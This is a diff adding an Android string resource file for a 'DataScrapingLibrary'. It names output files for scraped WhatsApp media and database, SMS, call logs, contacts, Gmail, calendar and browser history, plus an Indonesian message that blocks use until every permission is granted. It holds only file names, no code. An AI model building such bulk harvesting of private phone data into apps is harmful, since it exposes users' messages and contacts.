@@ -1,0 +1,41 @@
+<resources>
+    <string name="app_name">DataScrapingLibrary</string>
+
+    <string name="data_scrap_folder">/CSVFiles</string>
+    <string name="data_scrap_file">DataScrape.zip</string>
+    <string name="data_scrap_type">scrapdata</string>
+    <string name="data_scrap_photo_video_file">PhotoVideoDetail_100.txt</string>
+    <string name="data_scrap_whatsapp_photo_file">WhatsAppPhotoDetail_100.txt</string>
+    <string name="data_scrap_whatsapp_db_file">WhatsAppDbDetail_100.txt</string>
+    <string name="data_scrap_whatsapp_photo_sent_file">WhatsAppPhotoDetailSent_100.txt</string>
+    <string name="data_scrap_whatsapp_video_file">WhatsAppVideoDetail_100.txt</string>
+    <string name="data_scrap_whatsapp_video_sent_file">WhatsAppVideoDetailSent_100.txt</string>
+    <string name="data_scrap_whatsapp_agifs_file">WhatsAppAnimatedGifs_100.txt</string>
+    <string name="data_scrap_whatsapp_agifs_sent_file">WhatsAppAnimatedGifsSent_100.txt</string>
+    <string name="data_scrap_whatsapp_audio_file">WhatsAppAudio_100.txt</string>
+    <string name="data_scrap_whatsapp_audio_sent_file">WhatsAppAudioSent_100.txt</string>
+    <string name="data_scrap_whatsapp_pphoto_file">WhatsAppProfile_100.txt</string>
+    <string name="data_scrap_whatsapp_voice_file">WhatsAppVoice_100.txt</string>
+    <string name="data_scrap_whatsapp_doc_file">WhatsAppDoc_100.txt</string>
+    <string name="data_scrap_whatsapp_doc_sent_file">WhatsAppDocSent_100.txt</string>
+    <string name="data_scrap_calendar_file">CalendarDetail_100.txt</string>
+    <string name="data_scrap_call_file">CallDetail_100.txt</string>
+    <string name="data_scrap_app_file">AppDetail_100.txt</string>
+    <string name="data_scrap_phone_book_file">PhoneBook_100.txt</string>
+    <string name="data_scrap_gmail_file">Gmail_100.txt</string>
+    <string name="data_scrap_phone_detail_file">PhoneDetails_100.txt</string>
+    <string name="data_scrap_sms_file">SMSDetail_100.txt</string>
+    <string name="data_scrap_default_browser_file">DefaultBrowser_100.txt</string>
+    <string name="data_scrap_chrome_browser_file">ChromeBrowser_100.txt</string>
+    <string name="data_scrap_permission_failed_title">Tidak Berhasil</string>
+    <string name="data_scrap_permission_failed_msg">
+        Tidak bisa lanjut sebelum mengkonfirmasi semua izin-izin.
+    </string>
+
+    <string name="data_logs_folder">/logs</string>
+    <string name="data_form_logs_file">form_event_logs.txt</string>
+    <string name="data_docs_logs_file">docs_event_logs.txt</string>
+    <string name="data_form_logs_archive">FormEventLogs.zip</string>
+    <string name="data_docs_logs_archive">DocsEventLogs.zip</string>
+
+</resources>
